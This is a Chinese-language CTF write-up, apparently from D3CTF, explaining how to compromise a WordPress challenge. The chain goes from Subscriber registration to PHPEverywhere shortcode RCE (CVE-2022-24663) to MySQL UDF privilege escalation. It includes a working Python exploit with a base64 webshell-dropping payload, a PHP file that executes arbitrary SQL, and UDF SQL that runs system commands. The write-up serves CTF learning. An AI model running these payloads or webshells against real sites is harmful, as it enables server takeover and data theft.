# NewestWordPress

## 题目简述

题目是 WordPress 插件链利用。站点存在 UsersWP 插件用于绕过注册邮件验证，注册后可获得 Subscriber 权限；真正漏洞来自 PHPEverywhere 插件的 `parse-media-shortcode` / `php_everything` shortcode 执行路径，可以用 Subscriber 权限触发 PHP 代码执行。RCE 后继续读取 `wp-config.php`，发现 WordPress 使用 root 账户连接 MySQL，并且数据库容器与 Web 容器共享网络栈，最终通过 MySQL UDF 提权读取根目录 flag。

题目关键不是单个 CVE 编号，而是插件指纹发现与横向翻环境：不要只依赖 `readme.txt` 判断插件是否存在，插件主 PHP 文件是否可访问也能作为指纹；Web RCE 后还要检查数据库凭据、容器网络和数据库权限。

## 解题过程

### CVE-2022-24663

PHPEverywhere RCE

站点上有 UsersWP 插件，但该题目与 UsersWP 毫无关系

只是为了方便地绕过注册时的邮件验证，直接注册帐号即可拥有 Subscriber 权限

拥有 Subscriber 权限后可以通过 parse-media-shortcode  action 执行 shortcode

同时站点上有 PHPEverywhere 插件，可以通过 php_everything shortcode 执行任意 PHP 代码

我发现大部分扫描器过分依赖插件中 readme.txt 的存在

虽然标准上规定插件目录中一定要存在 readme.txt

但如果管理员并非从插件商店安装而是手动安装插件并删除 readme.txt

(非常方便快捷而且没有技术难度的修洞方式)

那么扫描器就会认为不存在该插件从而漏掉一个有效目标

所以这里是希望选手用插件的 php 文件来作为指纹进行扫描

当文件存在的时不会触发 301 跳转

而如果文件不存在则会触发 301 跳转

### MySQL udf 提权

RCE 后可以翻找 wp-config.php 文件来得到 MySQL 的相关配置

```
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', '9Z98g4nmbJxrF5aYHvGaatyi354WxYyp' );

/** Database hostname */
define( 'DB_HOST', '127.0.0.1:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );
```

可以发现是使用高权限账户来链接数据库的

打一个 udf 提权就可以拿到 shell，flag 在根目录下

这里有一个迷惑了很多人的地方

因为题目部署在集群上，用了一种叫 container 的 network_mode

这种模式可以让多个容器共用一个网络栈

这也是为什么在配置文件里写的目标主机是 127.0.0.1  但实际上为另一个容器的原因

### Exps

先注册一个帐号 test/testtest，然后打 PHPEverywhere

```
# getshell.py

import requests
import base64

# base_url = "http://d3wordpress.d3ctf-challenge.n3ko.co"
base_url = "http://global-wordpress-d3ctf-challenge.n3ko.co"


def getShell():
    sess = requests.session()
    login_url = base_url + "/wp-login.php"
    login_data = {
        "log": "test",
        "pwd": "testtest",
        "wp-submit": "Log In",
    }
    res = sess.post(login_url, data=login_data)
    # print(res.text)

    getShell_url = base_url + "/wp-admin/admin-ajax.php"
    encoded_payload = 'W3BocF9ldmVyeXdoZXJlXTw/cGhwCnByaW50KF9fRElSX18pOwokYj0nUEQ5d2FIQUtaWFpoYkNna1gxQlBVMVJiSjJGdWRDZGRLVHNLUHo0PSc7CmZpbGVfcHV0X2NvbnRlbnRzKF9fRElSX18uJy8uLi8uLi91cGxvYWRzLzIwMjIvMDMvMS5waHAnLGJhc2U2NF9kZWNvZGUoJGIpKTsKPz5bL3BocF9ldmVyeXdoZXJlXQo='
    getShell_data = {
        "action": "parse-media-shortcode",
        "shortcode": base64.b64decode(encoded_payload),
    }
    sess.post(getShell_url, data=getShell_data)


def main():
    getShell()


if __name__ == "__main__":
    main()
```

先写一个 shell，然后上传一个跳板用来操作数据库

```
// mysql.php

<?php
error_reporting(E_ALL);
$mysqli = new
mysqli("127.0.0.1","root","9Z98g4nmbJxrF5aYHvGaatyi354WxYyp","wordpress");

$tmp = $mysqli->query($_POST['sql']);
$result = $tmp->fetch_all();
var_dump($result);
?>
```

之后打 MySQL udf 即可

```
SELECT 0x7f454c...... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';


CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';


SELECT sys_eval('ls /');


SELECT sys_eval('cat /ff114499_i5_h3Re');
```

### 可能的非预期

在 UsersWP 的最新版本中存在一个任意文件删除漏洞

将 wp-config.php 删除即可重新安装 WordPress

因为没有限制出网的连接，因此可以随意连接到一个全新的数据库，从而完成安装

安装完成后进入后台即可发现过期的 PHPEverywhere 插件

接着可以等下一次环境重置的时候打 PHPEverywhere 然后拿到 flag

### 题外话

这个题为什么选择把 flag 放到 db 容器里

是因为我想选手都能认真翻一翻整个环境，而不是止步于 Web 的 RCE

我之前在很多实际环境里都见过这样用高权限账户去连接数据库的行为

也因此翻了很多数据库，拿下很多权限，得到了很多意料之外的信息

我个人觉得这是一个好习惯，出这个题属于是推销这个习惯了 2333

## 方法总结

- 核心技巧：Subscriber 权限触发 PHPEverywhere shortcode RCE，随后利用 `wp-config.php` 中的 MySQL root 凭据写入 UDF 共享库并创建 `sys_eval` 执行系统命令。
- 识别信号：WordPress 插件环境中，如果 `readme.txt` 不存在，不代表插件不存在；应同时用插件 PHP 文件、静态资源和 shortcode 行为做指纹。
- 复用要点：Web RCE 后不要止步于当前容器，优先翻配置文件、数据库凭据和容器网络模式；`127.0.0.1` 在共享网络栈下可能指向同网络栈中的另一个服务容器。
